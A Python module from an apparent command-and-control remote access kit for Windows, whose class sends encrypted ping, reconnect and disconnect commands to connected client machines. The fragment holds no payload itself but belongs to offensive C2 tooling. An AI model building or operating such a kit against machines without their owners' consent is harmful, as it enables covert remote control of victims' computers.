#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.2
# -------------------------------------------------------------
from ..networking.socket import ServerSocket
from ..networking.receiver_socket import ReceiverSocket
from ..client_handling.flags import ClientActionFlags
from ..threading.threads import MultiThreading

class NetHandle:
    #Function will ping the client
    def ping_client(self,encryption_key,client):
        MultiThreading().create_background_thread_arg(ReceiverSocket().recv_ping_reply,encryption_key)                          #Create socket to catch response in new thread
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().ping_client}{ClientActionFlags().seperator} ') #Ping the client

    #Function will tell client to reconnect
    def client_reconnect(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().reconnect_client}{ClientActionFlags().seperator} ') #Tell client to reconnect

    #Function will disconnect client, client will kill process
    def disconnect_client(self,encryption_key,client):
        ServerSocket().send_data_to_client(client,encryption_key,f'{ClientActionFlags().disconnect}{ClientActionFlags().seperator} ') #Tell client to disconnect